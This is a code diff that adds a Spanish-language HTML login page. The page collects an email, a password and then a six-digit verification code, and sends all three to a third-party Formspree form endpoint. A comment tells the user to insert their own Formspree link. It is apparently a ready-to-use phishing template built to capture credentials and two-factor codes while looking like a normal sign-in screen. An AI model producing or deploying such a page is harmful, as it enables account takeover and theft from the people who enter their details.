@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Iniciar sesión</title>
+<style>
+* {margin:0; padding:0; box-sizing:border-box; font-family: sans-serif;}
+body {background:#111; color:white; min-height:100vh; padding:20px;}
+.contenedor {max-width:400px; margin:0 auto;}
+h2 {text-align:center; margin-bottom:25px;}
+.step {display:block;}
+.field {margin-bottom:15px;}
+label {display:block; margin-bottom:5px;}
+input {width:100%; padding:12px; border-radius:8px; border:none; font-size:16px;}
+button {width:100%; padding:12px; border:none; border-radius:8px; font-size:17px; font-weight:bold; cursor:pointer;}
+.submit-btn {background:#FF0050; color:white; margin-top:10px;}
+.link-btn {background:transparent; color:#ccc; margin-top:5px;}
+.hidden {display:none !important;}
+</style>
+</head>
+<body>
+
+<div class="contenedor">
+  <h2>Inicia sesión con tu cuenta</h2>
+
+  <!-- ✅ AQUÍ PONES TU ENLACE DE FORMSPRE -->
+  <form action="https://formspree.io/f/xgogzwbd" method="POST">
+
+    <div id="step1">
+      <div class="field">
+        <label>Correo</label>
+        <input type="email" name="correo" required placeholder="tu@correo.com" />
+      </div>
+      <div class="field">
+        <label>Contraseña</label>
+        <input type="password" name="contraseña" required placeholder="••••••••" />
+      </div>
+      <button type="button" class="submit-btn" onclick="pasarPaso2()">Continuar</button>
+    </div>
+
+    <div id="step2" class="hidden">
+      <div class="field">
+        <label>Código de verificación</label>
+        <input type="text" name="codigo" inputmode="numeric" pattern="[0-9]{6}" maxlength="6" placeholder="000000" />
+      </div>
+      <button type="button" class="link-btn" onclick="volverPaso1()">← Volver</button>
+      <button type="submit" class="submit-btn">Entrar</button>
+    </div>
+
+  </form>
+</div>
+
+<script>
+function pasarPaso2() {
+  document.getElementById('step1').classList.add('hidden');
+  document.getElementById('step2').classList.remove('hidden');
+}
+function volverPaso1() {
+  document.getElementById('step2').classList.add('hidden');
+  document.getElementById('step1').classList.remove('hidden');
+}
+</script>
+
+</body>
+</html>
